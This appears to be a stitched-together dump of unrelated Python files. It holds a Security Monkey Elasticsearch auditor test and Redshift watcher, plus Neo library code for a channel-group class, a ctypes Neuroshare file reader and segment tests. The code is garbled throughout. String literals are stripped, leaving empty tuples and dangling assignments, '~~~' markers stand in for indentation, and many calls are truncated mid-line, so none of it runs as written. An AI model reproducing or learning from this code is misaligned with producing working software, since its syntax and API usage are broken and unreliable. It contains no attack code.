ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test" , config ElasticSearchServiceItem ( region = "us-west-2" , account = "TEST_ACCOUNT" , name = "es_test_2" , config ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_3" , config ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test_4" , config ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test_5" , config ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_6" , config ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_7" , config ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_8" , config ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test_9" , config ] \n 
\n 
# Add the fake source account into the database: \n 
test_account = Account ( ) \n 
test_account . name = "TEST_ACCOUNT" \n 
test_account . notes = "TEST ACCOUNT" \n 
test_account . s3_name = "TEST_ACCOUNT" \n 
test_account . number = "012345678910" \n 
test_account . role_name = "TEST_ACCOUNT" \n 
\n 
db . session . add ( test_account ) \n 
db . session . commit ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
# Remove the fake source account from the database: \n 
~~~ test_account = Account . query . filter ( Account . number == "012345678910" ) . first ( ) \n 
if test_account is not None : \n 
~~~ db . session . delete ( test_account ) \n 
db . session . commit ( ) \n 
\n 
~~ ~~ def test_es_auditor ( self ) : \n 
~~~ from security_monkey . auditors . elasticsearch_service import ElasticSearchServiceAuditor \n 
es_auditor = ElasticSearchServiceAuditor ( accounts = [ "012345678910" ] ) \n 
\n 
# Add some test network whitelists into this: \n 
es_auditor . network_whitelist = [ ] \n 
for cidr in WHITELIST_CIDRS : \n 
~~~ whitelist_cidr = NetworkWhitelistEntry ( ) \n 
whitelist_cidr . cidr = cidr [ 1 ] \n 
whitelist_cidr . name = cidr [ 0 ] \n 
\n 
es_auditor . network_whitelist . append ( whitelist_cidr ) \n 
\n 
~~ for es_domain in self . es_items : \n 
~~~ es_auditor . check_es_access_policy ( es_domain ) \n 
\n 
# Check for correct number of issues located: \n 
# CONFIG ONE: \n 
~~ self . assertEquals ( len ( self . es_items [ 0 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 0 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG TWO: \n 
self . assertEquals ( len ( self . es_items [ 1 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 1 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG THREE: \n 
self . assertEquals ( len ( self . es_items [ 2 ] . audit_issues ) , 2 ) \n 
self . assertEquals ( self . es_items [ 2 ] . audit_issues [ 0 ] . score , 5 ) \n 
self . assertEquals ( self . es_items [ 2 ] . audit_issues [ 1 ] . score , 7 ) \n 
\n 
# CONFIG FOUR: \n 
self . assertEquals ( len ( self . es_items [ 3 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 3 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG FIVE: \n 
self . assertEquals ( len ( self . es_items [ 4 ] . audit_issues ) , 0 ) \n 
\n 
# CONFIG SIX: \n 
self . assertEquals ( len ( self . es_items [ 5 ] . audit_issues ) , 0 ) \n 
\n 
# CONFIG SEVEN: \n 
self . assertEquals ( len ( self . es_items [ 6 ] . audit_issues ) , 3 ) \n 
self . assertEquals ( self . es_items [ 6 ] . audit_issues [ 0 ] . score , 5 ) \n 
self . assertEquals ( self . es_items [ 6 ] . audit_issues [ 1 ] . score , 5 ) \n 
self . assertEquals ( self . es_items [ 6 ] . audit_issues [ 2 ] . score , 7 ) \n 
\n 
# CONFIG EIGHT: \n 
self . assertEquals ( len ( self . es_items [ 7 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 7 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG NINE: \n 
self . assertEquals ( len ( self . es_items [ 8 ] . audit_issues ) , 2 ) \n 
self . assertEquals ( self . es_items [ 8 ] . audit_issues [ 0 ] . score , 6 ) \n 
self . assertEquals ( self . es_items [ 8 ] . audit_issues [ 1 ] . score , 10 ) \n 
#     Copyright 2014 Yelp, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
~~ ~~ """\n.. module: security_monkey.watchers.redshift\n    :platform: Unix\n\n.. version:: $$VERSION$$\n.. moduleauthor:: Ivan Leichtling <ivanlei@yelp.com> @c0wl\n\n""" \n 
\n 
from security_monkey . watcher import Watcher \n 
from security_monkey . watcher import ChangeItem \n 
from security_monkey . constants import TROUBLE_REGIONS \n 
from security_monkey . exceptions import BotoConnectionIssue \n 
from security_monkey import app \n 
\n 
from boto . redshift import regions \n 
\n 
\n 
class Redshift ( Watcher ) : \n 
~~~ index = \n 
i_am_singular = \n 
i_am_plural = \n 
\n 
def __init__ ( self , accounts = None , debug = False ) : \n 
~~~ super ( Redshift , self ) . __init__ ( accounts = accounts , debug = debug ) \n 
\n 
~~ def slurp ( self ) : \n 
~~~ """\n        :returns: item_list - list of Redshift Policies.\n        :returns: exception_map - A dict where the keys are a tuple containing the\n            location of the exception and the value is the actual exception\n\n        """ \n 
self . prep_for_slurp ( ) \n 
from security_monkey . common . sts_connect import connect \n 
item_list = [ ] \n 
exception_map = { } \n 
for account in self . accounts : \n 
~~~ for region in regions ( ) : \n 
~~~ app . logger . debug ( "Checking {}/{}/{}" . format ( self . index , account , region . name ) ) \n 
try : \n 
~~~ redshift = connect ( account , , region = region ) \n 
\n 
all_clusters = [ ] \n 
marker = None \n 
while True : \n 
~~~ response = self . wrap_aws_rate_limited_call ( \n 
redshift . describe_clusters , \n 
marker = marker \n 
) \n 
all_clusters . extend ( response [ ] [ if response [ ] [ ] [ ] ~~~ marker = response [ ] [ ] [ ~~ else : \n 
~~~ break \n 
\n 
~~ ~~ ~~ except Exception as e : \n 
~~~ if region . name not in TROUBLE_REGIONS : \n 
~~~ exc = BotoConnectionIssue ( str ( e ) , , account , region . name ) \n 
self . slurp_exception ( ( self . index , account , region . name ) , exc , exception_map ) ~~ continue \n 
~~ app . logger . debug ( "Found {} {}" . format ( len ( all_clusters ) , Redshift . i_am_plural ) ) \n 
for cluster in all_clusters : \n 
~~~ cluster_id = cluster [ ] \n 
if self . check_ignore_list ( cluster_id ) : \n 
~~~ continue \n 
\n 
~~ item = RedshiftCluster ( region = region . name , account = account , name = cluster_id , config item_list . append ( item ) \n 
\n 
~~ ~~ ~~ return item_list , exception_map \n 
\n 
\n 
~~ ~~ class RedshiftCluster ( ChangeItem ) : \n 
~~~ def __init__ ( self , region = None , account = None , name = None , config = { } ) : \n 
~~~ super ( RedshiftCluster , self ) . __init__ ( \n 
index = Redshift . index , \n 
region = region , \n 
account = account , \n 
name = name , \n 
new_config = config ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ \n 
\n 
# needed for python 3 compatibility \n 
from __future__ import absolute_import , division , print_function \n 
\n 
import numpy as np \n 
\n 
from neo . core . container import Container \n 
\n 
\n 
class RecordingChannelGroup ( Container ) : \n 
~~~ \n 
\n 
_container_child_objects = ( , ) \n 
_data_child_objects = ( , ) \n 
_multi_child_objects = ( , ) \n 
_single_parent_objects = ( , ) \n 
_recommended_attrs = ( ( ( , np . ndarray , 1 , np . dtype ( ) ) , \n 
( , np . ndarray , 1 , np . dtype ( ) ) ) + \n 
Container . _recommended_attrs ) \n 
\n 
def __init__ ( self , channel_names = None , channel_indexes = None , name = None , \n 
description = None , file_origin = None , ** annotations ) : \n 
~~~ \n 
# Inherited initialization \n 
# Sets universally recommended attributes, and places all others \n 
# in annotations \n 
super ( RecordingChannelGroup , self ) . __init__ ( name = name , \n 
description = description , \n 
file_origin = file_origin , \n 
** annotations ) \n 
\n 
# Defaults \n 
if channel_indexes is None : \n 
~~~ channel_indexes = np . array ( [ ] , dtype = np . int ) \n 
~~ if channel_names is None : \n 
~~~ channel_names = np . array ( [ ] , dtype = ) \n 
\n 
# Store recommended attributes \n 
~~ self . channel_names = channel_names \n 
self . channel_indexes = channel_indexes \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """\nNeuroshareIO is a wrap with ctypes of neuroshare DLLs.\nNeuroshare is a C API for reading neural data.\nNeuroshare also provides a Matlab and a Python API on top of that.\n\nNeuroshare is an open source API but each dll is provided directly by the vendor.\nThe neo user have to download separtatly the dll on neurosharewebsite:\nhttp://neuroshare.sourceforge.net/\n\nFor some vendors (Spike2/CED , Clampfit/Abf, ...), neo.io also provides pure Python\nNeo users you should prefer them of course :)\n\nSupported : Read\n\nAuthor: sgarcia\n\n""" \n 
\n 
import sys \n 
import ctypes \n 
import os \n 
\n 
# file no longer exists in Python3 \n 
try : \n 
~~~ file \n 
~~ except NameError : \n 
~~~ import io \n 
file = io . BufferedReader \n 
\n 
~~ import numpy as np \n 
import quantities as pq \n 
\n 
from neo . io . baseio import BaseIO \n 
from neo . core import Segment , AnalogSignal , SpikeTrain , EventArray \n 
\n 
ns_OK = 0 #Function successful \n 
ns_LIBERROR = - 1 #Generic linked library error \n 
ns_TYPEERROR = - 2 #Library unable to open file type \n 
ns_FILEERROR = - 3 #File access or read error \n 
ns_BADFILE = - 4 # Invalid file handle passed to function \n 
ns_BADENTITY = - 5 #Invalid or inappropriate entity identifier specified \n 
ns_BADSOURCE = - 6 #Invalid source identifier specified \n 
ns_BADINDEX = - 7 #Invalid entity index specified \n 
\n 
\n 
class NeuroshareError ( Exception ) : \n 
~~~ def __init__ ( self , lib , errno ) : \n 
~~~ self . lib = lib \n 
self . errno = errno \n 
pszMsgBuffer = ctypes . create_string_buffer ( 256 ) \n 
self . lib . ns_GetLastErrorMsg ( pszMsgBuffer , ctypes . c_uint32 ( 256 ) ) \n 
errstr = . format ( errno , pszMsgBuffer . value ) \n 
Exception . __init__ ( self , errstr ) \n 
\n 
~~ ~~ class DllWithError ( ) : \n 
~~~ def __init__ ( self , lib ) : \n 
~~~ self . lib = lib \n 
\n 
~~ def __getattr__ ( self , attr ) : \n 
~~~ f = getattr ( self . lib , attr ) \n 
return self . decorate_with_error ( f ) \n 
\n 
~~ def decorate_with_error ( self , f ) : \n 
~~~ def func_with_error ( * args ) : \n 
~~~ errno = f ( * args ) \n 
if errno != ns_OK : \n 
~~~ raise NeuroshareError ( self . lib , errno ) \n 
~~ return errno \n 
~~ return func_with_error \n 
\n 
\n 
~~ ~~ class NeurosharectypesIO ( BaseIO ) : \n 
~~~ """\n    Class for reading file trougth neuroshare API.\n    The user need the DLLs in the path of the file format.\n\n    Usage:\n        >>> from neo import io\n        >>> r = io.NeuroshareIO(filename=\'a_file\', dllname=the_name_of_dll)\n        >>> seg = r.read_segment(lazy=False, cascade=True, import_neuroshare_segment=True)\n        >>> print seg.analogsignals        # doctest: +ELLIPSIS, +NORMALIZE_WHITESPACE\n        [<AnalogSignal(array([ -1.77246094e+02,  -2.24707031e+02,  -2.66015625e+02,\n        ...\n        >>> print seg.spiketrains\n        []\n        >>> print seg.eventarrays\n        [<EventArray: 1@1.12890625 s, 1@2.02734375 s, 1@3.82421875 s>]\n\n    Note:\n        neuroshare.ns_ENTITY_EVENT: are converted to neo.EventArray\n        neuroshare.ns_ENTITY_ANALOG: are converted to neo.AnalogSignal\n        neuroshare.ns_ENTITY_NEURALEVENT: are converted to neo.SpikeTrain\n\n        neuroshare.ns_ENTITY_SEGMENT: is something between serie of small AnalogSignal\n                                        and Spiketrain with associated waveforms.\n                                        It is arbitrarily converted as SpikeTrain.\n\n\n    """ \n 
\n 
is_readable = True \n 
is_writable = False \n 
\n 
supported_objects = [ Segment , AnalogSignal , EventArray , SpikeTrain ] \n 
readable_objects = [ Segment ] \n 
writeable_objects = [ ] \n 
\n 
has_header = False \n 
is_streameable = False \n 
\n 
read_params = { Segment : [ ] } \n 
write_params = None \n 
\n 
name = \n 
extensions = [ ] \n 
mode = \n 
\n 
\n 
\n 
def __init__ ( self , filename = , dllname = ) : \n 
~~~ """\n        Arguments:\n            filename: the file to read\n            ddlname: the name of neuroshare dll to be used for this file\n        """ \n 
BaseIO . __init__ ( self ) \n 
self . dllname = dllname \n 
self . filename = filename \n 
\n 
\n 
\n 
\n 
\n 
~~ def read_segment ( self , import_neuroshare_segment = True , \n 
lazy = False , cascade = True ) : \n 
~~~ """\n        Arguments:\n            import_neuroshare_segment: import neuroshare segment as SpikeTrain with associated waveforms or not imported at all.\n\n        """ \n 
seg = Segment ( file_origin = os . path . basename ( self . filename ) , ) \n 
\n 
if sys . platform . startswith ( ) : \n 
~~~ neuroshare = ctypes . windll . LoadLibrary ( self . dllname ) \n 
~~ elif sys . platform . startswith ( ) : \n 
~~~ neuroshare = ctypes . cdll . LoadLibrary ( self . dllname ) \n 
~~ neuroshare = DllWithError ( neuroshare ) \n 
\n 
\n 
\n 
\n 
# API version \n 
info = ns_LIBRARYINFO ( ) \n 
neuroshare . ns_GetLibraryInfo ( ctypes . byref ( info ) , ctypes . sizeof ( info ) ) \n 
seg . annotate ( neuroshare_version = str ( info . dwAPIVersionMaj ) + + str ( info . dwAPIVersionMin ) ) \n 
\n 
if not cascade : \n 
~~~ return seg \n 
\n 
\n 
# open file \n 
~~ hFile = ctypes . c_uint32 ( 0 ) \n 
neuroshare . ns_OpenFile ( ctypes . c_char_p ( self . filename ) , ctypes . byref ( hFile ) ) \n 
fileinfo = ns_FILEINFO ( ) \n 
neuroshare . ns_GetFileInfo ( hFile , ctypes . byref ( fileinfo ) , ctypes . sizeof ( fileinfo ) ) \n 
\n 
# read all entities \n 
for dwEntityID in range ( fileinfo . dwEntityCount ) : \n 
~~~ entityInfo = ns_ENTITYINFO ( ) \n 
neuroshare . ns_GetEntityInfo ( hFile , dwEntityID , ctypes . byref ( entityInfo ) , ctypes . sizeof ( \n 
# EVENT \n 
if entity_types [ entityInfo . dwEntityType ] == : \n 
~~~ pEventInfo = ns_EVENTINFO ( ) \n 
neuroshare . ns_GetEventInfo ( hFile , dwEntityID , ctypes . byref ( pEventInfo ) , ctypes . sizeof \n 
if pEventInfo . dwEventType == 0 : #TEXT \n 
~~~ pData = ctypes . create_string_buffer ( pEventInfo . dwMaxDataLength ) \n 
~~ elif pEventInfo . dwEventType == 1 : #CVS \n 
~~~ pData = ctypes . create_string_buffer ( pEventInfo . dwMaxDataLength ) \n 
~~ elif pEventInfo . dwEventType == 2 : # 8bit \n 
~~~ pData = ctypes . c_byte ( 0 ) \n 
~~ elif pEventInfo . dwEventType == 3 : # 16bit \n 
~~~ pData = ctypes . c_int16 ( 0 ) \n 
~~ elif pEventInfo . dwEventType == 4 : # 32bit \n 
~~~ pData = ctypes . c_int32 ( 0 ) \n 
~~ pdTimeStamp = ctypes . c_double ( 0. ) \n 
pdwDataRetSize = ctypes . c_uint32 ( 0 ) \n 
\n 
ea = EventArray ( name = str ( entityInfo . szEntityLabel ) , ) \n 
if not lazy : \n 
~~~ times = [ ] \n 
labels = [ ] \n 
for dwIndex in range ( entityInfo . dwItemCount ) : \n 
~~~ neuroshare . ns_GetEventData ( hFile , dwEntityID , dwIndex , \n 
ctypes . byref ( pdTimeStamp ) , ctypes . byref ( pData ) , \n 
ctypes . sizeof ( pData ) , ctypes . byref ( pdwDataRetSize ) ) \n 
times . append ( pdTimeStamp . value ) \n 
labels . append ( str ( pData . value ) ) \n 
~~ ea . times = times * pq . s \n 
ea . labels = np . array ( labels , dtype = ) \n 
~~ else : \n 
~~~ ea . lazy_shape = entityInfo . dwItemCount \n 
~~ seg . eventarrays . append ( ea ) \n 
\n 
# analog \n 
~~ if entity_types [ entityInfo . dwEntityType ] == : \n 
~~~ pAnalogInfo = ns_ANALOGINFO ( ) \n 
\n 
neuroshare . ns_GetAnalogInfo ( hFile , dwEntityID , ctypes . byref ( pAnalogInfo ) , ctypes . sizeof dwIndexCount = entityInfo . dwItemCount \n 
\n 
if lazy : \n 
~~~ signal = [ ] * pq . Quantity ( 1 , pAnalogInfo . szUnits ) \n 
~~ else : \n 
~~~ pdwContCount = ctypes . c_uint32 ( 0 ) \n 
pData = np . zeros ( ( entityInfo . dwItemCount , ) , dtype = ) \n 
total_read = 0 \n 
while total_read < entityInfo . dwItemCount : \n 
~~~ dwStartIndex = ctypes . c_uint32 ( total_read ) \n 
dwStopIndex = ctypes . c_uint32 ( entityInfo . dwItemCount - total_read ) \n 
\n 
neuroshare . ns_GetAnalogData ( hFile , dwEntityID , dwStartIndex , \n 
dwStopIndex , ctypes . byref ( pdwContCount ) , pData [ total_read : ] . ctypes total_read += pdwContCount . value \n 
\n 
~~ signal = pq . Quantity ( pData , units = pAnalogInfo . szUnits , copy = False ) \n 
\n 
#t_start \n 
~~ dwIndex = 0 \n 
pdTime = ctypes . c_double ( 0 ) \n 
neuroshare . ns_GetTimeByIndex ( hFile , dwEntityID , dwIndex , ctypes . byref ( pdTime ) ) \n 
\n 
anaSig = AnalogSignal ( signal , \n 
sampling_rate = pAnalogInfo . dSampleRate * pq . Hz , \n 
t_start = pdTime . value * pq . s , \n 
name = str ( entityInfo . szEntityLabel ) , \n 
) \n 
anaSig . annotate ( probe_info = str ( pAnalogInfo . szProbeInfo ) ) \n 
if lazy : \n 
~~~ anaSig . lazy_shape = entityInfo . dwItemCount \n 
~~ seg . analogsignals . append ( anaSig ) \n 
\n 
\n 
#segment \n 
~~ if entity_types [ entityInfo . dwEntityType ] == and import_neuroshare_segment \n 
~~~ pdwSegmentInfo = ns_SEGMENTINFO ( ) \n 
if not str ( entityInfo . szEntityLabel ) . startswith ( ) : \n 
~~~ continue \n 
\n 
~~ neuroshare . ns_GetSegmentInfo ( hFile , dwEntityID , \n 
ctypes . byref ( pdwSegmentInfo ) , ctypes . sizeof ( pdwSegmentInfo nsource = pdwSegmentInfo . dwSourceCount \n 
\n 
pszMsgBuffer = ctypes . create_string_buffer ( " " * 256 ) \n 
neuroshare . ns_GetLastErrorMsg ( ctypes . byref ( pszMsgBuffer ) , 256 ) \n 
\n 
for dwSourceID in range ( pdwSegmentInfo . dwSourceCount ) : \n 
~~~ pSourceInfo = ns_SEGSOURCEINFO ( ) \n 
neuroshare . ns_GetSegmentSourceInfo ( hFile , dwEntityID , dwSourceID , \n 
ctypes . byref ( pSourceInfo ) , ctypes . sizeof ( pSourceInfo ) ) \n 
\n 
~~ if lazy : \n 
~~~ sptr = SpikeTrain ( times , name = str ( entityInfo . szEntityLabel ) , t_stop = 0. * pq . s ) sptr . lazy_shape = entityInfo . dwItemCount \n 
~~ else : \n 
~~~ pdTimeStamp = ctypes . c_double ( 0. ) \n 
dwDataBufferSize = pdwSegmentInfo . dwMaxSampleCount * pdwSegmentInfo . dwSourceCount \n 
pData = np . zeros ( ( dwDataBufferSize ) , dtype = ) \n 
pdwSampleCount = ctypes . c_uint32 ( 0 ) \n 
pdwUnitID = ctypes . c_uint32 ( 0 ) \n 
\n 
nsample = int ( dwDataBufferSize ) \n 
times = np . empty ( ( entityInfo . dwItemCount ) , dtype = ) \n 
waveforms = np . empty ( ( entityInfo . dwItemCount , nsource , nsample ) , dtype = ) \n 
for dwIndex in range ( entityInfo . dwItemCount ) : \n 
~~~ neuroshare . ns_GetSegmentData ( hFile , dwEntityID , dwIndex , \n 
ctypes . byref ( pdTimeStamp ) , pData . ctypes . data_as ( ctypes . POINTER ( ctypes . c_double dwDataBufferSize * 8 , ctypes . byref ( pdwSampleCount ) , \n 
ctypes . byref ( pdwUnitID ) ) \n 
\n 
times [ dwIndex ] = pdTimeStamp . value \n 
waveforms [ dwIndex , : , : ] = pData [ : nsample * nsource ] . reshape ( nsample , nsource ) . \n 
~~ sptr = SpikeTrain ( times = pq . Quantity ( times , units = , copy = False ) , \n 
t_stop = times . max ( ) , \n 
waveforms = pq . Quantity ( waveforms , units = str ( pdwSegmentInfo left_sweep = nsample / 2. / float ( pdwSegmentInfo . dSampleRate ) * pq sampling_rate = float ( pdwSegmentInfo . dSampleRate ) * pq . Hz , \n 
name = str ( entityInfo . szEntityLabel ) , \n 
) \n 
~~ seg . spiketrains . append ( sptr ) \n 
\n 
\n 
# neuralevent \n 
~~ if entity_types [ entityInfo . dwEntityType ] == : \n 
\n 
~~~ pNeuralInfo = ns_NEURALINFO ( ) \n 
neuroshare . ns_GetNeuralInfo ( hFile , dwEntityID , \n 
ctypes . byref ( pNeuralInfo ) , ctypes . sizeof ( pNeuralInfo ) ) \n 
\n 
if lazy : \n 
~~~ times = [ ] * pq . s \n 
t_stop = 0 * pq . s \n 
~~ else : \n 
~~~ pData = np . zeros ( ( entityInfo . dwItemCount , ) , dtype = ) \n 
dwStartIndex = 0 \n 
dwIndexCount = entityInfo . dwItemCount \n 
neuroshare . ns_GetNeuralData ( hFile , dwEntityID , dwStartIndex , \n 
dwIndexCount , pData . ctypes . data_as ( ctypes . POINTER ( ctypes . c_double ) ) ) \n 
times = pData * pq . s \n 
t_stop = times . max ( ) \n 
~~ sptr = SpikeTrain ( times , t_stop = t_stop , \n 
name = str ( entityInfo . szEntityLabel ) , ) \n 
if lazy : \n 
~~~ sptr . lazy_shape = entityInfo . dwItemCount \n 
~~ seg . spiketrains . append ( sptr ) \n 
\n 
# close \n 
~~ ~~ neuroshare . ns_CloseFile ( hFile ) \n 
\n 
seg . create_many_to_one_relationship ( ) \n 
return seg \n 
\n 
\n 
\n 
\n 
# neuroshare structures \n 
~~ ~~ class ns_FILEDESC ( ctypes . Structure ) : \n 
~~~ _fields_ = [ ( , ctypes . c_char * 32 ) , \n 
( , ctypes . c_char * 8 ) , \n 
( , ctypes . c_char * 8 ) , \n 
( , ctypes . c_char * 16 ) , \n 
] \n 
\n 
\n 
~~ class ns_LIBRARYINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ ( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 64 ) , \n 
( , ctypes . c_char * 64 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ns_FILEDESC * 16 ) , \n 
] \n 
\n 
~~ class ns_FILEINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ ( , ctypes . c_char * 32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_char * 64 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 256 ) , \n 
] \n 
\n 
~~ class ns_ENTITYINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ ( , ctypes . c_char * 32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
] \n 
\n 
~~ entity_types = { 0 : , \n 
1 : , \n 
2 : , \n 
3 : , \n 
4 : , \n 
} \n 
\n 
class ns_EVENTINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 128 ) , \n 
] \n 
\n 
~~ class ns_ANALOGINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_char * 16 ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 16 ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 16 ) , \n 
( , ctypes . c_char * 128 ) , \n 
] \n 
\n 
\n 
~~ class ns_SEGMENTINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_char * 32 ) , \n 
] \n 
\n 
~~ class ns_SEGSOURCEINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 16 ) , \n 
( , ctypes . c_double ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 16 ) , \n 
( , ctypes . c_char * 128 ) , \n 
] \n 
\n 
~~ class ns_NEURALINFO ( ctypes . Structure ) : \n 
~~~ _fields_ = [ \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_uint32 ) , \n 
( , ctypes . c_char * 128 ) , \n 
] \n 
\n 
\n 
\n 
# -*- coding: utf-8 -*- \n 
~~ """\nTests of the neo.core.segment.Segment class\n""" \n 
\n 
# needed for python 3 compatibility \n 
from __future__ import absolute_import , division , print_function \n 
\n 
from datetime import datetime \n 
\n 
try : \n 
~~~ import unittest2 as unittest \n 
~~ except ImportError : \n 
~~~ import unittest \n 
\n 
~~ import numpy as np \n 
import quantities as pq \n 
\n 
try : \n 
~~~ from IPython . lib . pretty import pretty \n 
~~ except ImportError as err : \n 
~~~ HAVE_IPYTHON = False \n 
~~ else : \n 
~~~ HAVE_IPYTHON = True \n 
\n 
~~ from neo . core . segment import Segment \n 
from neo . core import ( AnalogSignalArray , Block , \n 
Epoch , EpochArray , \n 
RecordingChannelGroup , SpikeTrain , Unit ) \n 
from neo . core . container import filterdata \n 
from neo . test . tools import ( assert_neo_object_is_compliant , \n 
assert_same_sub_schema ) \n 
from neo . test . generate_datasets import ( fake_neo , get_fake_value , \n 
get_fake_values , get_annotations , \n 
clone_object , TEST_ANNOTATIONS ) \n 
\n 
\n 
class Test__generate_datasets ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ np . random . seed ( 0 ) \n 
self . annotations = dict ( [ ( str ( x ) , TEST_ANNOTATIONS [ x ] ) for x in \n 
range ( len ( TEST_ANNOTATIONS ) ) ] ) \n 
\n 
~~ def test__get_fake_values ( self ) : \n 
~~~ self . annotations [ ] = 0 \n 
file_datetime = get_fake_value ( , datetime , seed = 0 ) \n 
rec_datetime = get_fake_value ( , datetime , seed = 1 ) \n 
index = get_fake_value ( , int , seed = 2 ) \n 
name = get_fake_value ( , str , seed = 3 , obj = Segment ) \n 
description = get_fake_value ( , str , seed = 4 , obj = ) \n 
file_origin = get_fake_value ( , str ) \n 
attrs1 = { : file_datetime , \n 
: rec_datetime , \n 
: index , \n 
: name , \n 
: description , \n 
: file_origin } \n 
attrs2 = attrs1 . copy ( ) \n 
attrs2 . update ( self . annotations ) \n 
\n 
res11 = get_fake_values ( Segment , annotate = False , seed = 0 ) \n 
res12 = get_fake_values ( , annotate = False , seed = 0 ) \n 
res21 = get_fake_values ( Segment , annotate = True , seed = 0 ) \n 
res22 = get_fake_values ( , annotate = True , seed = 0 ) \n 
\n 
self . assertEqual ( res11 , attrs1 ) \n 
self . assertEqual ( res12 , attrs1 ) \n 
self . assertEqual ( res21 , attrs2 ) \n 
self . assertEqual ( res22 , attrs2 ) \n 
\n 
~~ def test__fake_neo__cascade ( self ) : \n 
~~~ self . annotations [ ] = None \n 
obj_type = Segment \n 
cascade = True \n 
res = fake_neo ( obj_type = obj_type , cascade = cascade ) \n 
\n 
self . assertTrue ( isinstance ( res , Segment ) ) \n 
assert_neo_object_is_compliant ( res ) \n 
self . assertEqual ( res . annotations , self . annotations ) \n 
\n 
self . assertEqual ( len ( res . analogsignalarrays ) , 1 ) \n 
self . assertEqual ( len ( res . analogsignals ) , 1 ) \n 
self . assertEqual ( len ( res . irregularlysampledsignals ) , 1 ) \n 
self . assertEqual ( len ( res . spiketrains ) , 1 ) \n 
self . assertEqual ( len ( res . spikes ) , 1 ) \n 
self . assertEqual ( len ( res . events ) , 1 ) \n 
self . assertEqual ( len ( res . epochs ) , 1 ) \n 
self . assertEqual ( len ( res . eventarrays ) , 1 ) \n 
self . assertEqual ( len ( res . epocharrays ) , 1 ) \n 
for child in res . children : \n 
~~~ del child . annotations [ ] \n 
del child . annotations [ ] \n 
\n 
~~ self . assertEqual ( res . analogsignalarrays [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . analogsignals [ 0 ] . annotations , \n 
self . annotations ) \n 
self . assertEqual ( res . irregularlysampledsignals [ 0 ] . annotations , \n 
self . annotations ) \n 
